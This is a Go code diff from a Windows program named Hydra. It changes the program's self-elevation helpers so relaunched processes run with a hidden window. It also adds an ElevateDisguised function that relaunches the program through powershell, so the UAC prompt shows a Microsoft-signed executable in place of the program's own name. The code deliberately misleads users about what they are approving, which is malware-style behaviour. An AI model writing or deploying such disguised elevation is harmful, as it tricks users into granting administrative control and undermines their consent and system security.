@@ -5,10 +5,13 @@ import (
 	"os"
 	"os/user"
 	"path/filepath"
-	"strings"
 	"syscall"
 
 	"golang.org/x/sys/windows"
+)
+
+const (
+	runasCmd = "Start-Process \"%s\" -Verb runas -Arg 'chill'"
 )
 
 //RunningAsAdmin returns whether the current process has administrative privileges.
@@ -82,13 +85,21 @@ func RunAsAdmin(command, arguments string) error {
 	cwd, _ := syscall.UTF16PtrFromString(t)
 	args, _ := syscall.UTF16PtrFromString(arguments)
 
-	return windows.ShellExecute(0, verb, exec, args, cwd, 1)
+	return windows.ShellExecute(0, verb, exec, args, cwd, windows.SW_HIDE)
 }
 
 //ElevateNormal attempts to relaunch Hydra with admin rights.
 //It displays a common UAC prompt to the user, with the name of the executable.
 func ElevateNormal() error {
 	exe, _ := os.Executable()
-	args := strings.Join(os.Args[1:], " ")
-	return RunAsAdmin(exe, args)
+	return RunAsAdmin(exe, "chill")
+}
+
+//ElevateDisguised attempts to relaunch Hydra with admin rights.
+//It displays a common UAC prompt to the user, containing the details of an
+//executable signed by Microsoft, namely powershell.exe.
+func ElevateDisguised() error {
+	exe, _ := os.Executable()
+	args := fmt.Sprintf(runasCmd, exe)
+	return RunAsAdmin("powershell", args)
 }
